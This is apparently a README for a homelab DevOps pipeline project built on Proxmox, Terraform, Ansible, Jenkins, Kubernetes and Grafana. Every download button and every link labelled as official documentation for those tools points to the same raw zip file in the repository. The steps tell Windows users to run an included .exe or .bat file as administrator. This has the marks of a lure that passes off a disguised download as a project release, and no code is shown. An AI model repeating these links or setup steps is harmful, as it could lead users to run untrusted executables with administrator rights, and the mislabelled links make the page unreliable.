# 🛠️ full-stack-devops-homelab - Complete Homelab DevOps Pipeline

[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)

---

## 📋 About full-stack-devops-homelab

This project automates a complete DevOps workflow in a homelab environment. It sets up virtual machines, configures operating systems, and runs a containerized Django app on Kubernetes. Monitoring and continuous integration are part of the pipeline. 

Key technologies include:  
- Proxmox for virtual machine provisioning  
- Terraform to create resources  
- Ansible for system setup  
- Jenkins and GitLab for continuous integration and delivery  
- Kubernetes to deploy applications  
- Prometheus and Grafana for system monitoring  

This project has been tested through 38 full pipeline runs to show its reliability.

---

## 💻 System Requirements

Before running the software, make sure your system meets these requirements:

- Windows 10 or later (64-bit recommended)  
- At least 8 GB RAM (16 GB for smoother experience)  
- 50 GB free disk space  
- Internet connection to download required files  
- Enabled Hyper-V for virtualization or access to a Proxmox environment  
- Administrator rights on your Windows computer  

---

## 🔧 What You Get

This package includes:  
- Automation scripts for setting up virtual machines in Proxmox using Terraform  
- Configuration recipes using Ansible for setting up OS and software  
- CI/CD pipeline that runs Jenkins and integrates with GitLab  
- A sample Django application running inside Docker containers on Kubernetes  
- Monitoring setup using Prometheus and Grafana dashboards  
- Detailed logs and status reports after each pipeline run  

---

## 🚀 Getting Started

Follow these steps to download, install, and run the software on your Windows computer.

### 1. Download the Software

Visit the release page to get the latest version:  

[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)

Click the green button labeled **Assets** under the latest release and download the `.zip` or `.exe` file if available. You may find multiple files; choose the one that best fits your setup or follow instructions in the release notes.

### 2. Extract Files (if needed)

If you downloaded a `.zip` file:

- Right-click the file and select **Extract All...**  
- Choose a folder you can remember, such as `C:\full-stack-devops-homelab`  
- Click **Extract**

If you downloaded an executable (.exe), skip this step and proceed to step 3.

### 3. Run the Installer or Setup Script

- If an installer (`.exe`) is available, double-click it to start the installation.  
- Follow the on-screen instructions to complete the installation. Default options will suit most users.  
- If there is no installer, look for a setup script like `setup.bat` or `install.bat`. Right-click and choose **Run as administrator**. 

### 4. Launch the Application

- After installation, find the program shortcut on your desktop or in the Start Menu named **full-stack-devops-homelab**.  
- Double-click the shortcut to open the control panel.  
- If it opens a command window, the setup program may run automated steps. Watch for any messages and follow any prompts.

---

## ⚙️ Basic Usage

After installation, use these instructions to get the homelab pipeline running.

### Provision Virtual Machines

The software uses Terraform to create VMs on a Proxmox server. If you do not have access to Proxmox, skip this step or configure the scripts for your environment.

- Open the included `terraform` folder.  
- Edit `variables.tf` to add your Proxmox server details.  
- Run `terraform init` and then `terraform apply` from PowerShell or Command Prompt.  
- The system will create virtual machines following the specifications.  

### Configure Operating Systems

The software uses Ansible to install and configure software inside the VMs:

- Open the `ansible` folder.  
- Edit the `hosts` file to add IP addresses of your newly created VMs.  
- Open PowerShell or Command Prompt and run the command:  
  `ansible-playbook site.yml`  

This will configure your machines with required software and settings.

### CI/CD and Kubernetes

The scripts set up Jenkins and GitLab pipelines to build and deploy a Django app to Kubernetes.

- Access the Jenkins control panel from the VM IP address on port 8080 in a browser.  
- Check the Jenkins jobs and pipeline logs.  
- The Kubernetes cluster spans 4 nodes and runs the Django app inside Docker containers.

### Monitoring

Prometheus collects metrics from the cluster and app, while Grafana displays dashboards for visualization. Access Grafana using the web UI on port 3000.

---

## 🔗 Useful Links and Resources

- Proxmox official site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Terraform docs: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Ansible docs: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Jenkins documentation: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Kubernetes site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Prometheus site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
- Grafana site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip

---

## ❓ Troubleshooting Tips

- Make sure Hyper-V or virtualization is enabled on your Windows machine.  
- Verify that Proxmox credentials and IPs in the configuration files are correct.  
- If Terraform or Ansible commands fail, check your internet connection and try again.  
- Use a supported web browser when accessing Jenkins, Grafana, or Kubernetes dashboards.  
- Review any error messages carefully; they often explain what went wrong.  

---

## 📥 Download & Setup

Return to the release page to get the latest files and updates:  

[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)

Click **Assets**, download the latest install package or zip, then follow steps above to set up on your Windows PC.